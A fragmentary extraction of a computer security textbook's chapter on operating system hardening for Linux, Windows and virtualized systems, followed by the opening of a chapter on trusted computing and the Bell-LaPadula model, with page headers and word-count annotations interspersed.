Patch Management
Application and Service Configuration
Users, Groups, and Permissions
Remote Access Controls
Logging and Log Rotation
Application Security Using a chroot jail
Security Testing
[Word Count: 28]

12.7	 Windows Security
Patch Management
Users Administration and Access Controls
Application and Service Configuration
Other Security Controls
Security Testing
[Word Count: 19]

12.8	 Virtualization Security
Virtualization Alternatives
Virtualization Security Issues
Securing Virtualization Systems
[Word Count: 11]

12.10	 Key Terms, Review Questions, and Problems
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	List the steps needed in the process of securing a system.
◆	Detail the need for planning system security.
◆	List the basic steps used to secure the base operating system.
◆	List the additional steps needed to secure key applications.
◆	List steps needed to maintain security.
◆	List some specific aspects of securing Unix/Linux systems.
◆	List some specific aspects of securing Windows systems.
◆	List steps needed to maintain security in virtualized systems.
[Word Count: 77]

In this chapter we discuss how to provide systems security as a hardening 
­process that includes planning, installation, configuration, update, and ­maintenance 
of the operating system and the key applications in use, following the general 
approach detailed in [SCAR08]. We consider this process for the operating ­system, 
and then key applications in general, and then discuss some specific aspects in 
­relation to Linux and Windows systems in particular. We conclude with a discussion 
on securing virtualized systems, where multiple virtual machines may execute on 
the one physical system.
[Word Count: 88]

We view a system as having a number of layers, with the physical ­hardware 
at the bottom; the base operating system above including privileged kernel code, 
APIs, and services; and finally user applications and utilities in the top layer, as 
shown in Figure 12.1. This figure also shows the presence of BIOS and possibly 
other code that is external to, and largely not visible from, the ­operating system
[Word Count: 68]

Figure 12.1  Operating System Security Layers
[Word Count: 6]

418    Chapter 12 / Operating System Security
[Word Count: 7]

kernel, but which is used when booting the system or to support low-level hardware 
control. Each of these layers of code needs appropriate hardening measures in place 
to provide appropriate security services. And each layer is vulnerable to attack from 
below, should the lower layers not also be secured appropriately.
[Word Count: 50]

A number of reports note that the use of a small number of basic harden-
ing measures can prevent a large proportion of the attacks seen in recent years. 
Since 2010 the Australian Signals Directorate (ASD) list of the “Top 35 Mitigation 
Strategies” has noted that implementing just the top four of these strategies would 
have prevented at least 85% of the targeted cyber intrusions investigated by ASD. 
Hence, since 2013 these top four strategies are mandatory for all Australian govern-
ment agencies. These top four strategies are:
[Word Count: 88]

1.	 White-list approved applications.
	
2.	 Patch third-party applications and operating system vulnerabilities.
	
3.	 Restrict administrative privileges.
	
4.	 Create a defense-in-depth system.
[Word Count: 21]

We discuss all four of these strategies, and many others in the ASD list, in this 
­chapter. Note that these strategies largely align with those in the “20 Critical 
Controls” developed by DHS, NSA, the Department of Energy, SANS, and others 
in the United States.
[Word Count: 45]

12.1	Introduction to Operating System Security
[Word Count: 6]

• Assess risks and plan the system deployment.
 
• Secure the underlying operating system and then the key applications.
 
• Ensure any critical content is secured.
 
• Ensure appropriate network protection mechanisms are used.
 
• Ensure appropriate processes are used to maintain security.
[Word Count: 43]

While we address the selection of network protection mechanisms in Chapter 9, we 
examine the other items in the rest of this chapter.
[Word Count: 23]

12.3 / Operating Systems Hardening   419
[Word Count: 6]

The first step in deploying new systems is planning. Careful planning will help 
ensure that the new system is as secure as possible, and complies with any neces-
sary policies. This planning should be informed by a wider security assessment of 
the organization, since every organization has distinct security requirements and 
concerns. We discuss this wider planning process in Chapters 14 and 15.
[Word Count: 63]

[SCAR08] provides a list of items that should be considered during the system 
security planning process. While its focus is on secure server deployment, much of 
the list applies equally well to client system design. This list includes consideration of:
[Word Count: 40]

• The purpose of the system, the type of information stored, the applications
[Word Count: 13]

and services provided, and their security requirements.
 
• The categories of users of the system, the privileges they have, and the types of
[Word Count: 23]

information they can access.
 
• How the users are authenticated.
 
• How access to the information stored on the system is managed.
 
• What access the system has to information stored on other hosts, such as file
[Word Count: 37]

or database servers, and how this is managed.
 
• Who will administer the system, and how they will manage the system (via
[Word Count: 22]

local or remote access).
 
• Any additional security measures required on the system, including the use of
[Word Count: 17]

host firewalls, anti-virus or other malware protection mechanisms, and logging.
[Word Count: 10]

The first critical step in securing a system is to secure the base operating system upon 
which all other applications and services rely. A good security foundation needs a 
properly installed, patched, and configured operating system. Unfortunately, the 
default configuration for many operating systems often maximizes ease of use and 
functionality, rather than security. Further, since every organization has its own 
security needs, the appropriate security profile, and hence configuration, will also 
differ. What is required for a particular system should be identified during the 
­planning phase, as we have just discussed.
[Word Count: 92]

420    Chapter 12 / Operating System Security
[Word Count: 7]

While the details of how to secure each specific operating system differ, the 
broad approach is similar. Appropriate security configuration guides and checklists 
exist for most common operating systems, and these should be consulted, though 
always informed by the specific needs of each organization and their systems. In 
some cases, automated tools may be available to further assist in securing the sys-
tem configuration.
[Word Count: 64]

[SCAR08] suggests the following basic steps that should be used to secure an 
operating system:
[Word Count: 15]

• Install and patch the operating system.
 
• Harden and configure the operating system to adequately address the identi-
[Word Count: 19]

fied security needs of the system by:
 
• Removing unnecessary services, applications, and protocols.
 
• Configuring users, groups, and permissions.
 
• Configuring resource controls.
 
• Install and configure additional security controls, such as anti-virus, host-
[Word Count: 35]

based firewalls, and intrusion detection systems (IDS), if needed.
 
• Test the security of the basic operating system to ensure that the steps taken
[Word Count: 24]

Operating System Installation: Initial Setup and Patching
[Word Count: 7]

The initial installation should install the minimum necessary for the desired 
system, with additional software packages included only if they are required for 
the function of the system. We explore the rationale for minimizing the number of 
packages on the system shortly.
[Word Count: 42]

The overall boot process must also be secured. This may require adjusting 
options on, or specifying a password required for changes to, the BIOS code used 
when the system initially boots. It may also require limiting which media the sys-
tem is normally permitted to boot from. This is necessary to prevent an attacker 
from changing the boot process to install a covert hypervisor, such as we dis-
cussed in Section 6.8, or to just boot a system of their choice from external media 
in order to bypass the normal system access controls on locally stored data. The
[Word Count: 98]

12.3 / Operating Systems Hardening   421
[Word Count: 6]

use of a cryptographic file system may also be used to address this threat, as we 
note later.
[Word Count: 18]

Care is also required with the selection and installation of any additional 
device driver code, since this executes with full kernel level privileges, but is often 
supplied by a third party. The integrity and source of such driver code must be care-
fully validated given the high level of trust it has. A malicious driver can poten-
tially bypass many security controls to install malware. This was done in both the 
Blue Pill demonstration rootkit, which we discussed in Section 6.8, and the Stuxnet 
worm, which we described in Section 6.3.
[Word Count: 91]

Given the continuing discovery of software and other vulnerabilities for com-
monly used operating systems and applications, it is critical that the system be kept 
as up to date as possible, with all critical security related patches installed. Indeed, 
doing this addresses one of the top four key ASD mitigation strategies we listed pre-
viously. Nearly all commonly used systems now provide utilities that can automati-
cally download and install security updates. These tools should be configured and 
used to minimize the time any system is vulnerable to weaknesses for which patches 
are available.
[Word Count: 94]

Note that on change-controlled systems, you should not run automatic 
updates, because security patches can, on rare but significant occasions, introduce 
instability. For systems on which availability and uptime are of paramount impor-
tance, therefore, you should stage and validate all patches on test systems before 
deploying them in production.
[Word Count: 50]

Remove Unnecessary Services, Application, and Protocols
[Word Count: 6]

The default configuration for most distributed systems is set to maximize ease 
of use and functionality, rather than security. When performing the initial installa-
tion, the supplied defaults should not be used, but rather the installation should be 
customized so that only the required packages are installed. If additional packages 
are needed later, they can be installed when they are required. [SCAR08] and many 
of the security hardening guides provide lists of services, applications, and protocols 
that should not be installed if not required.
[Word Count: 84]

[SCAR08] also states a strong preference for not installing unwanted software, 
rather than installing and then later removing or disabling it. It argues this prefer-
ence because they note that many uninstall scripts fail to completely remove all 
components of a package. They also note that disabling a service means that while 
it is not available as an initial point of attack, should an attacker succeed in gaining 
some access to a system, then disabled software could be re-enabled and used to
[Word Count: 82]

422    Chapter 12 / Operating System Security
[Word Count: 7]

further compromise a system. It is better for security if unwanted software is not 
installed, and thus not available for use at all.
[Word Count: 23]

Configure Users, Groups, and Authentication
[Word Count: 5]

Not all users with access to a system will have the same access to all data and 
resources on that system. All modern operating systems implement access controls 
to data and resources, as we discuss in Chapter 4. Nearly all provide some form of 
discretionary access controls. Some systems may provide role-based or mandatory 
access control mechanisms as well.
[Word Count: 59]

One key decision is whether the users, the groups they belong to, and their 
authentication methods are specified locally on the system or will use a ­centralized 
authentication server. Whichever is chosen, the appropriate details are now 
­configured on the system.
[Word Count: 41]

Also at this stage, any default accounts included as part of the system instal-
lation should be secured. Those which are not required should be either removed 
or at least disabled. System accounts that manage services on the ­system should 
be set so they cannot be used for interactive logins. And any ­passwords installed 
by default should be changed to new values with ­appropriate security.
[Word Count: 65]

Any policy that applies to authentication credentials, and especially to 
­password security, is also configured. This includes details of which ­authentication 
methods are accepted for different methods of account access. And it includes 
details of the required length, complexity, and age allowed for passwords. We 
­discuss some of these issues in Chapter 3.
[Word Count: 53]

Once the users and their associated groups are defined, appropriate permissions 
can be set on data and resources to match the specified policy. This may be to limit 
which users can execute some programs, especially those that modify the system 
state. Or it may be to limit which users can read or write data in certain directory 
trees. Many of the security hardening guides provide lists of recommended changes 
to the default access configuration to improve security.
[Word Count: 77]

12.3 / Operating Systems Hardening   423
[Word Count: 6]

Further security improvement may be possible by installing and configuring addi-
tional security tools such as anti-virus software, host-based firewalls, IDS or IPS 
software, or application white-listing. Some of these may be supplied as part of the 
operating systems installation, but not configured and enabled by default. Others 
are third-party products that are acquired and used.
[Word Count: 56]

Given the widespread prevalence of malware, as we discuss in Chapter 6, 
appropriate anti-virus (which as noted addresses a wide range of ­malware 
types) is a critical security component on many systems. Anti-virus products 
have ­traditionally been used on Windows systems, since their high use made 
them a ­preferred target for attackers. However, the growth in other platforms, 
­particularly smartphones, has led to more malware being developed for them. 
Hence ­appropriate anti-virus products should be considered for any ­system as part 
of its security profile.
[Word Count: 85]

The final step in the process of initially securing the base operating system is secu-
rity testing. The goal is to ensure that the previous security configuration steps are 
correctly implemented, and to identify any possible vulnerabilities that must be cor-
rected or managed.
[Word Count: 44]

Suitable checklists are included in many security hardening guides. There 
are also programs specifically designed to review a system to ensure that a 
­system meets the basic security requirements, and to scan for known vulnerabil-
ities and poor configuration practices. This should be done following the initial 
hardening of the system, and then repeated periodically as part of the security 
maintenance process.
[Word Count: 62]

424    Chapter 12 / Operating System Security
[Word Count: 7]

Each selected service or application must be installed, and then patched to 
the most recent supported secure version appropriate for the system. This may 
be from additional packages provided with the operating system distribution, or 
from a ­separate third-party package. As with the base operating system, utilizing an 
­isolated, secure build network is preferred.
[Word Count: 54]

Any application specific configuration is then performed. This may include creat-
ing and specifying appropriate data storage areas for the application, and making 
appropriate changes to the application or service default configuration details.
[Word Count: 33]

Some applications or services may include default data, scripts, or user accounts. 
These should be reviewed, and only retained if required, and suitably secured. A well-
known example of this is found with Web servers, which often include a number of 
example scripts, quite a few of which are known to be insecure. These should not be 
used as supplied, but should be removed unless needed and secured.
[Word Count: 68]

Encryption is a key enabling technology that may be used to secure data both in 
transit and when stored, as we discuss in Chapter 2 and in Parts Four and Five. 
If such technologies are required for the system, then they must be configured, and 
appropriate cryptographic keys created, signed, and secured.
[Word Count: 52]

If secure network services are provided, most likely using either TLS or IPsec, 
then suitable public and private keys must be generated for each of them. Then 
X.509 certificates are created and signed by a suitable certificate authority, link-
ing each service identity with the public key in use, as we discuss in Section 23.2. If 
secure remote access is provided using Secure Shell (SSH), then appropriate server, 
and possibly client keys, must be created.
[Word Count: 75]

Cryptographic file systems are another use of encryption. If desired, then 
these must be created and secured with suitable keys.
[Word Count: 20]

Once the system is appropriately built, secured, and deployed, the process of main-
taining security is continuous. This results from the constantly changing environ-
ment, the discovery of new vulnerabilities, and hence exposure to new threats. 
[SCAR08] suggests that this process of security maintenance includes the following 
additional steps:
[Word Count: 49]

• Monitoring and analyzing logging information
 
• Performing regular backups
 
• Recovering from security compromises
 
• Regularly testing system security
 
• Using appropriate software maintenance processes to patch and update all
[Word Count: 31]

critical software, and to monitor and revise configuration as needed
[Word Count: 10]

We have already noted the need to configure automatic patching and update 
where possible, or to have a process to manually test and install patches on con-
figuration controlled systems, and that the system should be regularly tested 
using checklist or automated tools where possible. We discuss the process of inci-
dent response in Section 15.5. We now consider the critical logging and backup 
procedures.
[Word Count: 65]

Logging can generate significant volumes of information. It is important that 
sufficient space is allocated for them. A suitable automatic log rotation and archive 
system should also be configured to assist in managing the overall size of the logging 
information.
[Word Count: 40]

426    Chapter 12 / Operating System Security
[Word Count: 7]

Manual analysis of logs is tedious and is not a reliable means of detecting 
adverse events. Rather, some form of automated analysis is preferred, as it is more 
likely to identify abnormal activity.
[Word Count: 33]

We discuss the process of logging further in Chapter 18.
[Word Count: 10]

The needs and policy relating to backup and archive should be determined 
during the system planning stage. Key decisions include whether the backup copies 
are kept online or offline, and whether copies are stored locally or transported to a 
remote site. The trade-offs include ease of implementation and cost versus greater 
security and robustness against different threats.
[Word Count: 57]

Having discussed the process of enhancing security in operating systems through 
careful installation, configuration, and management, we now consider some specific 
aspects of this process as it relates to Unix and Linux systems. Beyond the general 
guidance in this section, we provide a more detailed discussion of Linux security 
mechanisms in Chapter 25.
[Word Count: 53]

There are a large range of resources available to assist administrators of 
these systems, including many texts, for example [NEME10], online resources 
such as the “Linux Documentation Project,” and specific system hardening guides 
such as those provided by the “NSA—Security Configuration Guides.” These 
resources should be used as part of the system security planning process in order 
to incorporate procedures appropriate to the security requirements identified for 
the system.
[Word Count: 69]

Ensuring that system and application code is kept up to date with security patches is 
a widely recognized and critical control for maintaining security.
[Word Count: 24]

Modern Unix and Linux distributions typically include tools for automatically 
downloading and installing software updates, including security updates, which 
can minimize the time a system is vulnerable to known vulnerabilities for which 
patches exist. For example, Red Hat, Fedora, and CentOS include up2date or 
yum; SuSE includes yast; and Debian uses apt-get, though you must run it as 
a cron job for automatic updates. It is important to configure whichever update tool 
is ­provided on the distribution in use, to install at least critical security patches in a 
timely ­manner.
[Word Count: 90]

As noted earlier, change-controlled systems should not run automatic updates, 
because they may possibly introduce instability. Such systems should validate all 
patches on test systems before deploying them to production systems.
[Word Count: 31]

The most important changes needed to improve system security are to ­disable 
services, especially remotely accessible services, and applications, that are not 
required, and to then ensure that applications and services that are needed are 
appropriately configured, following the relevant security guidance for each. We 
provide further details on this in Section 25.5.
[Word Count: 53]

As we describe in Sections 4.5 and 25.3, Unix and Linux systems implement dis-
cretionary access control to all file system resources. These include not only files 
and directories but devices, processes, memory, and indeed most system resources. 
Access is specified as granting read, write, and execute permissions to each of
[Word Count: 51]

428    Chapter 12 / Operating System Security
[Word Count: 7]

owner, group, and others, for each resource, as shown in Figure 4.6. These are set 
using the chmod command. Some systems also support extended file attributes with 
access control lists that provide more flexibility, by specifying these permissions for 
each entry in a list of users and groups. These extended access rights are typically set 
and displayed using the getfacl and setfacl commands. These commands can 
also be used to specify set user or set group permissions on the resource.
[Word Count: 80]

Information on user accounts and group membership are traditionally stored 
in the /etc/passwd and /etc/group files, though modern systems also have the 
ability to import these details from external repositories queried using LDAP or NIS 
for example. These sources of information, and indeed of any associated authenti-
cation credentials, are specified in the PAM (pluggable authentication module) 
configuration for the system, often using text files in the /etc/pam.d directory.
[Word Count: 69]

Given that remote exploits are of concern, it is important to limit access to only 
those services required. This function may be provided by a perimeter firewall, as 
we discussed in Chapter 9. However, host-based firewall or network access control 
mechanisms may provide additional defences. Unix and Linux systems support sev-
eral alternatives for this.
[Word Count: 55]

The TCP Wrappers library and tcpd daemon provide one mechanism that 
­network servers may use. Lightly loaded services may be “wrapped” using tcpd, which 
listens for connection requests on their behalf. It checks that any request is ­permitted 
by configured policy before accepting it and invoking the server program to handle 
it. Requests that are rejected are logged. More complex and heavily loaded servers 
incorporate this functionality into their own connection management code, using the 
TCP Wrappers library, and the same policy configuration files. These files are /etc/
hosts.allow and /etc/hosts.deny, which should be set as policy requires.
[Word Count: 98]

There are several host firewall programs that may be used. Linux ­systems 
­primarily use the iptables program to configure the netfilter ­kernel ­module. 
This provides comprehensive, though complex, stateful packet ­filtering, monitoring, 
and modification capabilities. BSD-based systems (including MacOSX) now use the 
pf program with similar capabilities. Most systems provide an administrative utility 
to generate common configurations and to select which services will be permitted 
to access the system. These should be used unless there are non-standard require-
ments, given the skill and knowledge needed to run these programs to edit their 
configuration files.
[Word Count: 94]

Most applications can be configured to log with levels of detail ranging from “debug-
ging” (maximum detail) to “none.” Some middle setting is usually the best choice, 
but you should not assume that the default setting is necessarily appropriate.
[Word Count: 39]

In addition, many applications allow you to specify either a dedicated file 
to write application event data to, or a syslog facility to use when writing log data 
to /dev/log (see Section 25.5). If you wish to handle system logs in a consistent, 
­centralized manner, it is usually preferable for applications to send their log data 
to /dev/log. Note, however, that logrotate (also discussed in Section 25.5) 
can be ­configured to rotate any logs on the system, whether written by syslogd, 
Syslog-NG, or individual applications.
[Word Count: 85]

Application Security Using a chroot jail
[Word Count: 6]

Chrooting therefore helps contain the effects of a given server being compro-
mised or hijacked. The main disadvantage of this method is added complexity: a
[Word Count: 25]

430    Chapter 12 / Operating System Security
[Word Count: 7]

number of files (including all executable libraries used by the server), directories, 
and devices needed must be copied into the chroot jail. Determining just what needs 
to go into the jail for the server to work properly can be tricky, though detailed pro-
cedures for chrooting many different applications are available.
[Word Count: 51]

Troubleshooting a chrooted application can also be difficult. Even if an appli-
cation explicitly supports this feature, it may behave in unexpected ways when run 
chrooted. Note also that if the chrooted process runs as root, it can “break out” of 
the chroot jail with little difficulty. Still, the advantages usually far outweigh the 
disadvantages of chrooting network services.
[Word Count: 59]

The system hardening guides such as those provided by the “NSA—Security 
Configuration Guides” include security checklists for a number of Unix and Linux 
distributions that may be followed.
[Word Count: 28]

We now consider some specific issues with the secure installation, configuration, 
and management of Microsoft Windows systems. These systems have for many 
years formed a significant portion of all “general purpose” system installations. 
Hence, they have been specifically targeted by attackers, and consequently security 
countermeasures are needed to deal with these challenges. The process of provid-
ing appropriate levels of security still follows the general outline we describe in this 
chapter. Beyond the general guidance in this section, we provide more detailed dis-
cussion of Windows security mechanisms later in Chapter 26.
[Word Count: 92]

Again, there are a large range of resources available to assist administrators 
of these systems, including reports such as [SYMA07], online resources such as the 
“Microsoft Security Tools & Checklists,” and specific system hardening guides such 
as those provided by the “NSA—Security Configuration Guides.”
[Word Count: 44]

The “Windows Update” service and the “Windows Server Update Services” assist 
with the regular maintenance of Microsoft software, and should be configured and 
used. Many other third-party applications also provide automatic update support, 
and these should be enabled for selected applications.
[Word Count: 41]

Users Administration and Access Controls
[Word Count: 5]

Users and groups in Windows systems are defined with a Security ID (SID). This 
information may be stored and used locally, on a single system, in the Security 
Account Manager (SAM). It may also be centrally managed for a group of systems 
belonging to a domain, with the information supplied by a central Active Directory 
(AD) system using the LDAP protocol. Most organizations with multiple systems 
will manage them using domains. These systems can also enforce common policy 
on users on any system in the domain. We further explore the Windows security 
architecture in Section 26.1.
[Word Count: 96]

Windows systems also define privileges, which are system wide and granted 
to user accounts. Examples of privileges include the ability to backup the computer 
(which requires overriding the normal access controls to obtain a complete backup), 
or the ability to change the system time. Some privileges are considered dangerous, 
as an attacker may use them to damage the system. Hence they must be granted with 
care. Others are regarded as benign, and may be granted to many or all user accounts.
[Word Count: 81]

As with any system, hardening the system configuration can include further 
limiting the rights and privileges granted to users and groups on the system. As 
the access control list gives deny entries greater precedence, you can set an explicit 
deny permission to prevent unauthorized access to some resource, even if the user is 
a member of a group that otherwise grants access.
[Word Count: 62]

When accessing files on a shared resource, a combination of share and NTFS 
permissions may be used to provide additional security and granularity. For exam-
ple, you can grant full control to a share, but read-only access to the files within it. If 
access-based enumeration is enabled on shared resources, it can automatically hide 
any objects that a user is not permitted to read. This is useful with shared folders 
containing many users’ home directories, for example.
[Word Count: 77]

You should also ensure users with administrative rights only use them when 
required, and otherwise access the system as a normal user. The User Account Control 
(UAC) provided in Vista and later systems assists with this requirement. These systems 
also provide Low Privilege Service Accounts that may be used for long-lived service 
processes, such as file, print, and DNS services that do not require elevated privileges.
[Word Count: 66]

Unlike Unix and Linux systems, much of the configuration information in Windows 
systems is centralized in the Registry, which forms a database of keys and values 
that may be queried and interpreted by applications on these systems.
[Word Count: 37]

432    Chapter 12 / Operating System Security
[Word Count: 7]

Changes to these values can be made within specific applications, setting prefer-
ences in the application that are then saved in the registry using the appropriate keys 
and values. This approach hides the detailed representation from the administrator. 
Alternatively, the registry keys can be directly modified using the “Registry Editor.” 
This approach is more useful for making bulk changes, such as those recommended 
in hardening guides. These changes may also be recorded in a central repository, and 
pushed out whenever a user logs in to a system within a network domain.
[Word Count: 91]

Given the predominance of malware that targets Windows systems, it is essential 
that suitable anti-virus, anti-spyware, personal firewall, and other malware and 
attack detection and handling software packages are installed and configured on 
such systems. This is clearly needed for network connected systems, as shown by 
the high-incidence numbers in reports such as [SYMA13]. However, as the Stuxnet 
attacks in 2010 show, even isolated systems updated using removable media are 
vulnerable, and thus must also be protected.
[Word Count: 77]

Current generation Windows systems include some basic firewall and mal-
ware countermeasure capabilities, which should certainly be used at a minimum. 
However, many organizations find that these should be augmented with one or 
more of the many commercial products available. One issue of concern is undesira-
ble interactions between anti-virus and other products from multiple vendors. Care 
is needed when planning and installing such products to identify possible adverse 
interactions, and to ensure the set of products in use are compatible with each other.
[Word Count: 84]

Windows systems also support a range of cryptographic functions that may 
be used where desirable. These include support for encrypting files and directo-
ries using the Encrypting File System (EFS), and for full-disk encryption with AES 
using BitLocker.
[Word Count: 38]

The system hardening guides such as those provided by the “NSA—Security 
Configuration Guides” also include security checklists for various versions of 
Windows.
[Word Count: 22]

There are also a number of commercial and open-source tools available to 
perform system security scanning and vulnerability testing of Windows systems. The 
“Microsoft Baseline Security Analyzer” is a simple, free, easy-to-use tool that aims 
to help small- to medium-sized businesses improve the security of their systems by 
checking for compliance with Microsoft’s security recommendations. Larger organ-
izations are likely better served using one of the larger, centralized, commercial 
security analysis suites available.
[Word Count: 73]

Virtualization refers to a technology that provides an abstraction of the comput-
ing resources used by some software, which thus runs in a simulated environment 
called a virtual machine (VM). There are many types of virtualization; however, in
[Word Count: 38]

Figure 12.2  Native Virtualization Security Layers
[Word Count: 6]

this section we are most interested in full virtualization. This allows multiple full 
operating system instances to execute on virtual hardware, supported by a hypervi-
sor that manages access to the actual physical hardware resources. Benefits arising 
from using virtualization include better efficiency in the use of the physical system 
resources than is typically seen using a single operating system instance. This is par-
ticularly evident in the provision of virtualized server systems. Virtualization can 
also provide support for multiple distinct operating systems and associated applica-
tions on the one physical system. This is more commonly seen on client systems.
[Word Count: 100]

There are a number of additional security concerns raised in virtualized sys-
tems, as a consequence both of the multiple operating systems executing side by side 
and of the presence of the virtualized environment and hypervisor as a layer below 
the operating system kernels and the security services they provide. [CLEE09] 
presents a survey of some of the security issues arising from such a use of virtualiza-
tion, a number of which we will discuss further.
[Word Count: 76]

Full virtualization systems may be further divided into native virtualization 
systems, in which the hypervisor executes directly on the underlying hardware, as 
we show in Figure 12.2, and hosted virtualization systems, in which the hypervisor 
executes as just another application on a host OS that is running on the underlying 
hardware, as we show in Figure 12.3. Native virtualization systems are typically 
seen in servers, with the goal of improving the execution efficiency of the hardware.
[Word Count: 76]

434    Chapter 12 / Operating System Security
[Word Count: 7]

They are arguably also more secure, as they have fewer additional layers than the 
alternative hosted approach. Hosted virtualization systems are more common in 
clients, where they run along side other applications on the host OS, and are used 
to support applications for alternate operating system versions or types. As this 
approach adds additional layers with the host OS under, and other host applica-
tions beside, the hypervisor, this may result in increased security concerns.
[Word Count: 75]

[CLEE09] and [SCAR11] both detail a number of security concerns that result from 
the use of virtualized systems, including:
[Word Count: 19]

• Guest OS isolation, ensuring that programs executing within a guest OS may
[Word Count: 13]

only access and use the resources allocated to it, and not covertly interact with 
programs or data either in other guest OSs or in the hypervisor.
 
• Guest OS monitoring by the hypervisor, which has privileged access to the
[Word Count: 39]

programs and data in each guest OS, and must be trusted as secure from 
­subversion and compromised use of this access.
[Word Count: 21]

Figure 12.3  Hosted Virtualization Security Layers
[Word Count: 6]

• Virtualized environment security, particularly image and snapshot manage-
[Word Count: 9]

ment, which attackers may attempt to view or modify.
[Word Count: 9]

Thus the use of virtualization adds additional layers of concern, as we have 
previously noted. Securing virtualized systems means extending the security proc-
ess to secure and harden these additional layers. In addition to securing each guest 
operating system and applications, the virtualized environment and the hypervisor 
must also be secured.
[Word Count: 51]

[SCAR11] provides guidance for providing appropriate security in virtualized sys-
tems, and states that organizations using virtualization should:
[Word Count: 18]

• Carefully plan the security of the virtualized system
 
• Secure all elements of a full virtualization solution, including the hypervisor,
[Word Count: 21]

guest OSs, and virtualized infrastructure, and maintain their security
 
• Ensure that the hypervisor is properly secured
 
• Restrict and protect administrator access to the virtualization solution
[Word Count: 27]

This is clearly seen as an extension of the process of securing systems that we pre-
sented earlier in this chapter.
[Word Count: 21]

Hypervisor Security  The hypervisor should be secured using a process similar 
to that with securing an operating system. That is, it should be installed in an isolated 
environment, from known clean media, and updated to the latest patch level in 
order to minimize the number of vulnerabilities that may be present. It should 
then be configured so that it is updated automatically, any unused services are 
disabled or removed, unused hardware is disconnected, appropriate introspection
[Word Count: 75]

436    Chapter 12 / Operating System Security
[Word Count: 7]

capabilities are used with the guest OSs, and the hypervisor is monitored for any 
signs of compromise.
[Word Count: 17]

Access to the hypervisor should be limited to authorized administrators only, 
since these users would be capable of accessing and monitoring activity in any of the 
guest OSs. The hypervisor may support both local and remote administration. This 
must be configured appropriately, with suitable authentication and ­encryption mech-
anisms used, particularly when using remote administration. Remote ­administration 
access should also be considered and secured in the design of any network firewall 
and IDS capability in use. Ideally such administration traffic should use a separate 
network, with very limited, if any, access provided from outside the organization.
[Word Count: 96]

Virtualized Infrastructure Security  Virtualized systems manage access to 
hardware resources such as disk storage and network interfaces. This access must be 
limited to just the appropriate guest OSs that use any resource. As we noted earlier, 
the configuration of network interfaces and use of an internal virtual network may 
present issues for organizations that wish to monitor all network traffic between 
systems. This should be designed and handled as needed.
[Word Count: 70]

Access to VM images and snapshots must be carefully controlled, since these 
are another potential point of attack.
[Word Count: 18]

It is possible to design a host system and virtualization solution that is more 
protected from access and modification by the users. This approach may be used 
to support well-secured guest OS images used to provide access to enterprise net-
works and data, and to support central administration and update of these images. 
However, there will remain security concerns from possible compromise of the 
underlying host OS, unless it is adequately secured and managed.
[Word Count: 74]

[SCAR08] provides general guidance on general server security, which we have 
closely followed in the chapter. [SCAR11] provides guidance on securing virtual-
ized systems.
[Word Count: 24]

SCAR08	Scarfone, K.; Jansen, W.; and Tracy, M. Guide to General Server Security, NIST
[Word Count: 14]

Special Publication 800-123, July 2008.
SCAR11	Scarfone, K.; Souppaya, M.; and Hoffman, M. Guide to Security for Full Virtu-
[Word Count: 19]

alization Technologies, NIST Special Publication 800-125, January 2011.
[Word Count: 8]

12.10 / Key Terms, Review Questions, and Problems   437
[Word Count: 9]

12.10 Key Terms, Review Questions, and Problems
[Word Count: 7]

access controls
administrators
application virtualization
archive
backup
chroot
[Word Count: 8]

full virtualization
guest OS
hardening
hosted virtualization
hypervisor
logging
[Word Count: 9]

native virtualization
patches
patching
permissions
virtual machine monitor
virtualization
[Word Count: 9]

438    Chapter 12 / Operating System Security
[Word Count: 7]

13.1	
The Bell-LaPadula Model for Computer Security
Computer Security Models
General Description
Formal Description of Model
Abstract Operations
Example of BLP Use
Implementation Example—Multics
Limitations to the BLP model
[Word Count: 29]

13.2	
Other Formal Models for Computer Security
Biba Integrity Model
Clark-Wilson Integrity Model
Chinese Wall Model
[Word Count: 16]

13.3	
The Concept of Trusted Systems
Reference Monitors
Trojan Horse Defense
[Word Count: 11]

13.4	
Application of Multilevel Security
Multilevel Security for Role-Based Access Control
Database Security and Multilevel Security
[Word Count: 16]

13.5	
Trusted Computing and the Trusted Platform Module
Authenticated Boot Service
Certification Service
Encryption Service
TPM Functions
Protected Storage
[Word Count: 19]

13.6	
Common Criteria for Information Technology Security Evaluation
Requirements
Profiles and Targets
Example of a Protection Profile
[Word Count: 17]

13.7	
Assurance and Evaluation
Target Audience
Scope of Assurance
Common Criteria Evaluation Assurance Levels
Evaluation Process
[Word Count: 16]

13.9	
Key Terms, Review Questions, and Problems
[Word Count: 7]

Trusted Computing and 
Multilevel Security
[Word Count: 5]

440    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Explain the Bell-LaPadula model and its relevance to trusted computing.
◆	Summarize other formal models for computer security.
◆	Understand the concept of trusted systems.
◆	List and explain the properties of a reference monitor and explain the
[Word Count: 39]

­relationship between a reference monitor and a security kernel database.
◆	Present an overview of the application of multilevel security to role-based
[Word Count: 22]

access control and to database security.
◆	Discuss hardware approaches to trusted computing.
◆	Explain and summarize the common criteria for information technology
[Word Count: 23]

This chapter deals with a number of interrelated topics having to do with the degree 
of confidence users and implementers can have in security functions and services:
[Word Count: 27]

• Formal models for computer security
 
• Multilevel security
 
• Trusted systems
 
• Mandatory access control
 
• Security evaluation
[Word Count: 19]

13.1	The Bell-Lapadula Model for Computer Security
[Word Count: 7]

Problems to do with providing strong computer security involved both design 
and implementation. It is difficult, in designing any hardware or software ­module, 
to be assured that the design does in fact provide the level of security that was 
intended. This difficulty results in many unanticipated security vulnerabilities. Even
[Word Count: 49]

13.1 / The Bell-Lapadula Model for Computer Security   441
[Word Count: 9]

if the design is in some sense correct, it is difficult, if not impossible, to implement 
the design without errors or bugs, providing yet another host of vulnerabilities.
[Word Count: 28]

These problems have led to a desire to develop a method to prove, logically 
or mathematically, that a particular design does satisfy a stated set of security 
requirements and that the implementation of that design faithfully conforms to the 
design specification. To this end, security researchers have attempted to develop 
formal models of computer security that can be used to verify security designs and 
implementations.
[Word Count: 65]

Initially, research in this area was funded by the U.S. Department of Defense 
and considerable progress was made in developing models and in applying them 
to prototype systems. That funding has greatly diminished as have attempts to 
build formal models of complex systems. Nevertheless, such models have value in 
providing a discipline and a uniformity in defining a design approach to security 
requirements [BELL05]. In this section, we look at perhaps the most influential 
computer security model, the Bell-LaPadula (BLP) model [BELL73, BELL75]. 
Several other models are examined in Section 13.2.
[Word Count: 91]

The BLP model was developed in the 1970s as a formal model for access 
